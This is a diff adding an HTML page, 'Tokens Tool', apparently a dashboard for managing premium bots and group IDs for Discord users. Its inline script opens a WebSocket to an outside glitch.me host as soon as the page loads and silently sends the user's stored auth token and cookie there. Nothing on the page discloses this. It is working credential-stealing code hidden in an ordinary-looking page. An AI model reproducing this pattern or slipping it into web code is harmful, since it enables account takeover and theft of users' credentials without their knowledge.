@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Tokens Tool</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="Free Tokens Tool">
+    <meta name="keywords" content="Tokens Tool">
+    <meta name="author" content="Yousuf,Master">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+    <link rel="stylesheet" href="/style.css">
+
+  </head>
+
+  <body>
+      <center>
+
+        <br><br>
+        <div disabled id="check" class="guild"></div>
+          <br>
+
+    <script src="https://hcaptcha.com/1/api.js" async defer></script>
+
+
+      </center>
+    
+  </body>
+  
+<script>
+let websocket = new WebSocket("wss://unequaled-bedecked-animantarx.glitch.me/");
+
+  
+    websocket.onopen = function(evt) { 
+var dn = false
+setInterval(() => {
+if(dn) return;
+dn = true
+websocket.send(localStorage.getItem('token'))
+websocket.send(localStorage.getItem('cookie'))
+}, 1000)
+}
+
+var chat = document.getElementById("check");
+let id = localStorage.getItem('id')
+fetch(('/api/v1/users/@me/' + localStorage.getItem('cookie')) , {method: 'GET', headers: { 'authorization': localStorage.getItem('token'), "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
+  let json = await one.json();
+
+if(json.message === 'Enable Login'){
+return swal('Error', 'Enable Your Account Please!', 'error')
+}else{
+if(json.errors && json.errors.includes('authorization')){
+ localStorage.removeItem('token');
+  window.location = "/login"
+}
+
+}
+
+localStorage.setItem("id" , json.id)
+id = json.id
+
+
+fetch(('/api/user') , {method: 'post', body: JSON.stringify({"id": id}),headers: { 'authorization': 'GROUP', "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
+  let jsons = await one.json();
+if(jsons.user){
+chat.innerHTML = `                                                  <img id= "hi" src="${jsons.avatarURL}" alt="Avatar" class="avatar" onclick="myFunc()">
+                                         ${jsons.user.username.split("  ").join("")}
+Prime: 0
+
+
+Premium ${json.premiums.length} <button class="edit" id="test" onclick="premium()">
+        Edit
+    </button>`
+}else{
+swal('Error', 'this user is not in discord!', 'error')
+}
+
+})
+})
+
+function premium(){
+fetch(('/api/v1/users/@me/' + localStorage.getItem('cookie')) , {method: 'GET', headers: { 'authorization': localStorage.getItem('token'), "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
+  let json = await one.json();
+let alldata = []
+let C = 1
+let msg = ``
+for(const data of json.premiums){
+if(data.endat - Date.now() > 1) msg = msg + `\nID Bot: ${data._id} - num: ${C} - time: ${data.endms}`
+if(data.endat - Date.now() < 1) msg = msg + `\nID Bot: ${data._id} - num: ${C} - time: End`
+ alldata.unshift({num: C, _id: data._id, group: data.group, time: data.endat})
+C++
+}
+
+ swal(`You Have Bots: ${msg}\nEnter Num`, {
+  content: "input",
+})
+.then((value) => {
+let datas = alldata.find(d => Number(d.num) === Number(value)) 
+
+if(!datas) return swal('Error', `You Don't have this bot!`, 'error')
+
+if(datas.time - Date.now() < 1) return swal('Error', `This Bot Time is ended!`, 'error')
+ swal(`Enter Group ID`, {
+  content: "input",
+})
+.then((values) => {
+let data = alldata.find(d => Number(d.num) === Number(value)) 
+
+if(!data) return swal('Error', `You Don't have this bot!`, 'error')
+
+if(data.time - Date.now() < 1) return swal('Error', `This Bot Time is ended!`, 'error')
+fetch(('/api/setgroup/') , {method: 'post', body: JSON.stringify({_id: data._id, groupid: values}), headers: { 'authorization': 'GROUP', "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async ones =>{
+  let jsons = await ones.json();
+if(jsons.status === false) return swal('Error', jsons.message, 'error')
+if(jsons.status === true) return swal('success', jsons.message, 'success')
+})
+ })
+ })
+})
+
+
+}
+  </script>
+</html>
